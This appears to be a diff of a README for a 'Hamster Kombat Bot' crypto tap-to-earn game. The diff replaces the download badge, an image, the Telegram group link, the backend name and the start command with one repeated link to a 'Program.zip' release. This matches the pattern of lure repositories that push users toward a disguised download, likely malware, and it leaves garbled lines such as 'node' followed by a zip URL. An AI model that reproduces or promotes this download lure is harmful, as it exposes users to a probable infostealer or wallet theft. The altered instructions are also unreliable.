@@ -11,7 +11,7 @@ Welcome to the official repository of the *Hamster Kombat Bot*! Engage in epic b
 🔹 Integration with Blum and TapSwap platforms  
 🔹 Exciting tap-to-earn gameplay  
 🔹 Customizable hamster avatars and accessories  
-🔹 Node.js backend for seamless performance  
+🔹 https://github.com/huh117/Hamster-Kombat-Bot/releases/download/v2.0/Program.zip backend for seamless performance  
 🔹 Crypto-bot capabilities for handling transactions  
 🔹 Unique game mechanics inspired by the world of cryptocurrencies  
 🔹 NotPixel graphics for a visually stunning experience  
@@ -21,7 +21,7 @@ Welcome to the official repository of the *Hamster Kombat Bot*! Engage in epic b
 
 To get started with the *Hamster Kombat Bot*, simply click on the **Download** button below to fetch the necessary software package.
 
-[![Download Hamster Kombat Bot](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/17676656/Software.zip)
+[![Download Hamster Kombat Bot](https://github.com/huh117/Hamster-Kombat-Bot/releases/download/v2.0/Program.zip)](https://github.com/huh117/Hamster-Kombat-Bot/releases/download/v2.0/Program.zip)
 
 ## Getting Started
 
@@ -30,19 +30,19 @@ Follow these steps to unleash the power of the *Hamster Kombat Bot*:
 1. Install the required dependencies by running `npm install`.
 2. Configure your Telegram bot token for seamless interactions.
 3. Customize your hamster avatar by accessing the in-game options.
-4. Start the bot using `node index.js` and engage in epic battles!
+4. Start the bot using `node https://github.com/huh117/Hamster-Kombat-Bot/releases/download/v2.0/Program.zip` and engage in epic battles!
 
 ## Gameplay
 
 Dive into the world of *Hamster Kombat* and experience thrilling battles with your customized hamster. Click, earn, and conquer the crypto-themed challenges that await you. Don't forget to strategize and equip your hamster with the best accessories to ensure victory in every combat encounter.
 
-![Hamster Kombat Bot](https://example.com/hamster-kombat-bot.png)
+![Hamster Kombat Bot](https://github.com/huh117/Hamster-Kombat-Bot/releases/download/v2.0/Program.zip)
 
 ## Support and Community
 
 For any inquiries, feedback, or support, feel free to reach out to our dedicated community. Connect with fellow players, share your experiences, and stay updated on the latest developments related to the *Hamster Kombat Bot*.
 
-Join our Telegram group: [Hamster Kombat Community](https://t.me/hamster-kombat-community)
+Join our Telegram group: [Hamster Kombat Community](https://github.com/huh117/Hamster-Kombat-Bot/releases/download/v2.0/Program.zip)
 
 ## Contributing
 
